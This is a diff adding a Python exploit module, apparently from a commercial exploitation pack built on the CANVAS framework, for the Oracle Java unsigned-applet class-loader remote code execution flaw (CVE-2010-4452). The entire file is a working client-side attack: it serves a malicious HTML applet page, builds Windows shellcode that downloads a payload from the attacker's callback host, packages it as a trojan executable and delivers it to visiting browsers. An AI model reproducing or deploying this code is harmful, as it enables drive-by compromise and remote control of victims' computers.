@@ -1,0 +1,188 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+
+import sys
+import socket
+import struct
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import struct
+
+# GUI info
+NAME = "Oracle Java Unsigned Applet Applet2ClassLoader Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution Vulnerability in Oracle Java Unsigned Applet Applet2ClassLoader"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Oracle"
+DOCUMENTATION["Date public"] = "2011.02.15"
+DOCUMENTATION["VersionsAffected"] = "Oracle JDK/JRE 6 < Update 24"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://fhoguin.com/2011/03/oracle-java-unsigned-applet-applet2classloader-remote-code-execution-vulnerability-zdi-11-084-explained/"
+DOCUMENTATION["CVE Name"] = "CVE-2010-4452"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4452"
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['XP']
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : ["All"], 
+}
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1        
+        self.name = NAME 
+        self.filename = "index.html"
+        self.classfile = "app.class"
+        self.classname = ""                
+        self.trojannamew = "app.exe"
+        self.trojannamel = "app.bin"        
+        self.firsttime = True
+        return
+
+    
+    def makefile(self):
+        filedata = """
+<HTML>
+ <BODY>
+  <APPLET codebase="file:C:\Program Files\Java\jre6\lib\ext" code="CLASSNAME.class">
+   <PARAM NAME="host" VALUE="http://SERVERHOST:SERVERPORT/">
+  </APPLET>
+ </BODY>
+</HTML>
+"""
+        self.classname = "http://%s/app" % (self.decimalip(self.callback.ip))                                  
+        filedata = filedata.replace('SERVERHOST', self.callback.ip)      
+        filedata = filedata.replace('SERVERPORT', str(self.callback.port))        	
+        filedata = filedata.replace('CLASSNAME', self.classname)
+                        
+        if self.useSSL:
+            filedata = filedata.replace('http:', 'https:')
+        
+        return filedata
+                    
+    def decimalip(self, ip):
+        return struct.unpack('!L',socket.inet_aton(ip))[0]    
+         
+        
+    def maketrojan(self):
+        host = self.callback.ip
+        port = self.callback.port
+        
+        sc = shellcodeGenerator.win32()
+        sc.addAttr("findeipnoesp", {"subespval":0x0})                
+                        	
+        if self.useSSL:
+            ssl = "s"
+        else:
+            ssl = ""                
+            
+        sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+        sc.vAllocSelf = True
+        shellcode = sc.get()
+                     
+        myPElib = pelib.PElib()	
+        self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)        
+        self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojannamew))
+        file(self.trojannamew, "wb").write(self.mosdeftrojan)
+        
+        self.setInfo("%s - done"%(NAME))
+        ret = len(self.mosdeftrojan) != 0
+        
+        return ret
+
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()	
+        
+        user_agent  = clientheader.getStrValue(['User-Agent'])
+        
+        self.maketrojan()        
+                
+        # Start file request
+        if clientheader.URL.count(self.filename):             
+            self.log("Sending start file: %s" % (self.filename))            
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)                           
+        
+        # CLASS file request
+        elif clientheader.URL.count("class"):
+            self.log("Sending CLASS file")            
+            f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_classloader/" + self.classfile, "rb")
+            sploitstring = f.read()
+            f.close()                                                             
+            self.log("Sending %d bytes" % len(sploitstring))
+            h.addHeader("Content-type", "binary/octet-stream")
+            h.addHeader("Connection", "close")
+            b.setBody(sploitstring)     
+                                        	
+        # Windows MOSDEF trojan file request
+        elif clientheader.URL.count(self.trojannamew):
+            self.log("Sending MOSDEF trojan")
+            f = open(self.trojannamew, "rb")
+            sploitstring = f.read()
+            f.close()
+            os.remove(self.trojannamew)
+            self.log("Sending %d bytes" % len(sploitstring))
+            h.addHeader("Content-type", "binary/octet-stream")
+            h.addHeader("Connection", "close")
+            b.setBody(sploitstring)            
+        
+        # Redirect
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+            
+        return h, b
+
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+
+                           
+    def run(self):        
+        return 1
+
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
